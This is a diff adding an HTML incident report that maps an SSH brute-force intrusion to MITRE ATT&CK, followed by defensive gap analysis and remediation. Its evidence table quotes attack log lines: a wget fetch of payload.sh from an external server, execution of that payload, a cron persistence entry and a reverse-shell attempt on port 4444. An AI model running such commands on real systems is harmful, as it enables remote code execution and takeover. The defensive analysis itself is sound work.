@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MITRE ATT&CK Framework Mapping & Tactical Analysis</title>
+    <style>
+        :root {
+            --bg-color: #0f1115;
+            --text-color: #c9d1d9;
+            --accent-color: #58a6ff;
+            --danger-color: #f85149;
+            --success-color: #238636;
+            --border-color: #30363d;
+            --table-header-bg: #161b22;
+            --table-row-hover: #1f242c;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            margin: 0;
+            padding: 40px;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: #0d1117;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+
+        .classification {
+            background-color: rgba(248, 81, 73, 0.1);
+            color: var(--danger-color);
+            border: 1px solid var(--danger-color);
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            letter-spacing: 2px;
+            border-radius: 4px;
+            margin-bottom: 30px;
+        }
+
+        h1, h2, h3 {
+            color: #ffffff;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 8px;
+            margin-top: 40px;
+        }
+
+        h1 { margin-top: 0; font-size: 2em; border-bottom: none; text-align: center; }
+
+        .metadata-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            background: var(--table-header-bg);
+            padding: 20px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .metadata-grid p { margin: 0; font-size: 0.9em; }
+        .metadata-grid strong { color: var(--accent-color); }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.9em;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+            vertical-align: top;
+        }
+
+        th {
+            background-color: var(--table-header-bg);
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        tr:hover {
+            background-color: var(--table-row-hover);
+        }
+
+        code {
+            font-family: Consolas, Monaco, 'Courier New', monospace;
+            background-color: rgba(110, 118, 129, 0.4);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            color: #ff7b72;
+            word-break: break-all;
+        }
+
+        .gap-card {
+            background: rgba(248, 81, 73, 0.05);
+            border-left: 4px solid var(--danger-color);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .strength-card {
+            background: rgba(35, 134, 54, 0.05);
+            border-left: 4px solid var(--success-color);
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .footer {
+            margin-top: 50px;
+            text-align: right;
+            font-style: italic;
+            color: #8b949e;
+            border-top: 1px solid var(--border-color);
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="classification">CONFIDENTIAL // INTERNAL USE ONLY</div>
+
+    <h1>MITRE ATT&CK Framework Mapping & Tactical Analysis</h1>
+
+    <div class="metadata-grid">
+        <p><strong>Prepared By:</strong> Senior Threat Hunter (Intern Candidate)</p>
+        <p><strong>Associated Incident:</strong> INC-2026-06-23-001</p>
+    </div>
+
+    <h2>1. Overview of Threat Landscape</h2>
+    <p>This document provides a highly technical breakdown of the adversary's methodology mapped directly to the <strong>MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge)</strong> framework. By categorizing the attacker's behavior, our Security Operations Center (SOC) can identify defensive gaps and engineer highly specific detection rules (e.g., Sigma, YARA) for future proactive hunts.</p>
+
+    <h2>2. MITRE ATT&CK Matrix Mapping</h2>
+    <p>The following table details the specific Tactics, Techniques, and Sub-techniques utilized during the intrusion, accompanied by the raw telemetry evidence.</p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>MITRE Tactic</th>
+                <th>Technique Name & ID</th>
+                <th>Sub-technique</th>
+                <th>Telemetry / Evidence Artifact</th>
+                <th>Threat Context</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>Credential Access (TA0006)</strong></td>
+                <td>Brute Force (T1110)</td>
+                <td>Password Guessing (T1110.001)</td>
+                <td><code>Failed password for root from 192.168.1.100</code></td>
+                <td>The adversary utilized automated scripting to rapidly guess passwords against the SSH daemon.</td>
+            </tr>
+            <tr>
+                <td><strong>Initial Access (TA0001)</strong></td>
+                <td>Valid Accounts (T1078)</td>
+                <td>Local Accounts (T1078.003)</td>
+                <td><code>Accepted password for admin from 192.168.1.100</code></td>
+                <td>Following the brute force, the attacker successfully authenticated using the compromised <code>admin</code> credentials.</td>
+            </tr>
+            <tr>
+                <td><strong>Execution (TA0002)</strong></td>
+                <td>Command and Scripting Interpreter (T1059)</td>
+                <td>Unix Shell (T1059.004)</td>
+                <td><code>COMMAND=/bin/bash /tmp/payload.sh</code></td>
+                <td>The attacker leveraged the native <code>bash</code> interpreter to execute their downloaded payload, blending in with legitimate administrative activity.</td>
+            </tr>
+            <tr>
+                <td><strong>Command and Control (TA0011)</strong></td>
+                <td>Ingress Tool Transfer (T1105)</td>
+                <td>N/A</td>
+                <td><code>COMMAND=/usr/bin/wget http://malicious-server.xyz/payload.sh</code></td>
+                <td>The adversary used <code>wget</code>, a built-in Linux utility (Living off the Land binary), to pull their secondary payload from external infrastructure.</td>
+            </tr>
+            <tr>
+                <td><strong>Persistence (TA0003)</strong></td>
+                <td>Scheduled Task/Job (T1053)</td>
+                <td>Cron (T1053.003)</td>
+                <td><code>crond[4105]: (root) CMD (/tmp/payload.sh >/dev/null 2>&1)</code></td>
+                <td>A rogue cron job was established to ensure the malicious payload would re-execute automatically without requiring further exploitation.</td>
+            </tr>
+            <tr>
+                <td><strong>Command and Control (TA0011)</strong></td>
+                <td>Application Layer Protocol (T1071)</td>
+                <td>Web Protocols (T1071.001)</td>
+                <td><code>kernel: iptables: DROP... PROTO=TCP... DPT=4444</code></td>
+                <td>The executed payload attempted to establish a reverse TCP shell over port 4444 to give the attacker interactive terminal access.</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>3. Defensive Posture & Gap Analysis</h2>
+    <p>Based on the MITRE ATT&CK mapping above, we have identified the following gaps in our current security architecture:</p>
+
+    <div class="gap-card">
+        <strong>Gap in TA0006 (Credential Access):</strong> Our systems did not automatically block the IP address after 5 consecutive failed login attempts. <br>
+        <em>Remediation:</em> Implement <code>fail2ban</code> and integrate threat intelligence feeds into the edge firewall.
+    </div>
+
+    <div class="gap-card">
+        <strong>Gap in TA0001 (Initial Access):</strong> Single-factor authentication allowed immediate access upon password compromise. <br>
+        <em>Remediation:</em> Enforce Zero Trust principles and mandatory Multi-Factor Authentication (MFA) via PAM for all SSH connections.
+    </div>
+
+    <div class="strength-card">
+        <strong>Strength in TA0011 (Command and Control):</strong> Our egress firewall filtering (<code>iptables</code>) successfully detected and dropped the non-standard outbound connection to port 4444, preventing full system takeover. <br>
+        <em>Action:</em> Continue strict egress filtering and expand deep packet inspection (DPI) capabilities.
+    </div>
+
+    <h2>4. Conclusion for Security Engineering</h2>
+    <p>By mapping this incident to the MITRE ATT&CK framework, we transition from reactive incident response to proactive threat modeling. The SOC engineering team will use these exact technique IDs to build robust, automated SIEM alerts to ensure this specific attack chain is blocked autonomously in the future.</p>
+
+    <div class="footer">
+        Threat Hunting Division, Cyber Defense Team
+    </div>
+
+</div>
+
+</body>
+</html>
